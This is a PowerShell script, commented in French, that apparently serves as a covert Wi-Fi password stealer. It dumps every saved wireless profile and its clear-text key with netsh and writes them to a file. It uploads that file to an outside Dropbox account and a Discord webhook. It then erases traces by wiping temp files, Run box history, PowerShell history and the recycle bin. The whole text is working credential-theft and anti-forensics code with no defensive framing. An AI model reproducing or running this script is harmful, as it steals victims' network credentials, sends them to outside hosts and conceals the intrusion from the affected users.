$folderPath = "C:\ProgramData\CustomFolder"  # Chemin vers le dossier commun
$filePath = Join-Path -Path $folderPath -ChildPath "--wifi-pass.txt"

function ajouter_info_fichier {
    param (
        [string]$nom_fichier,
        [string]$info
    )
    Add-Content -Path $nom_fichier -Value $info
}

function DropBox-Upload {
    [CmdletBinding()]
    param (
        [Parameter (Mandatory = $True, ValueFromPipeline = $True)]
        [Alias("f")]
        [string]$SourceFilePath
    ) 
    $outputFile = Split-Path $SourceFilePath -leaf
    $TargetFilePath="/$outputFile"
    $arg = '{ "path": "' + $TargetFilePath + '", "mode": "add", "autorename": true, "mute": false }'
    $authorization = "Bearer " + $db
    $headers = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"
    $headers.Add("Authorization", $authorization)
    $headers.Add("Dropbox-API-Arg", $arg)
    $headers.Add("Content-Type", 'application/octet-stream')
    Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile $SourceFilePath -Headers $headers
}

function Upload-Discord {
    [CmdletBinding()]
    param (
        [parameter(Position=0,Mandatory=$False)]
        [string]$file,
        [parameter(Position=1,Mandatory=$False)]
        [string]$text 
    )

    $hookurl = "$dc"

    $Body = @{
      'username' = $env:username
      'content' = $text
    }

    if (-not ([string]::IsNullOrEmpty($text))){
        Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -Body ($Body | ConvertTo-Json)
    };

    if (-not ([string]::IsNullOrEmpty($file))){
        curl.exe -F "file1=@$file" $hookurl
    }
}

function Clean-Exfil { 
    # empty temp folder
    Remove-Item -Path $env:temp\* -Recurse -Force -ErrorAction SilentlyContinue

    # delete run box history
    reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f 

    # Delete powershell history
    Remove-Item (Get-PSreadlineOption).HistorySavePath -ErrorAction SilentlyContinue

    # Empty recycle bin
    Clear-RecycleBin -Force -ErrorAction SilentlyContinue
}

# Assurez-vous que le dossier existe, sinon, créez-le
if (-not (Test-Path $folderPath -PathType Container)) {
    New-Item -Path $folderPath -ItemType Directory | Out-Null
}

# Créer le fichier et écrire les informations
$wifiProfiles = (netsh wlan show profiles) | Select-String "\:(.+)$" | ForEach-Object {$name=$_.Matches.Groups[1].Value.Trim(); $_} | ForEach-Object {(netsh wlan show profile name="$name" key=clear)}  | Select-String "Key Content\W+\:(.+)$" | ForEach-Object {$pass=$_.Matches.Groups[1].Value.Trim(); $_} | ForEach-Object {[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Format-Table -AutoSize | Out-String
ajouter_info_fichier -nom_fichier $filePath -info $wifiProfiles

# Upload vers Dropbox
if (-not ([string]::IsNullOrEmpty($db))){
    DropBox-Upload -f $filePath
}

# Upload vers Discord
if (-not ([string]::IsNullOrEmpty($dc))){
    Upload-Discord -file $filePath
}

# Nettoyer les traces
if (-not ([string]::IsNullOrEmpty($ce))){
    Clean-Exfil
}

# Supprimer le fichier une fois terminé
Remove-Item $filePath
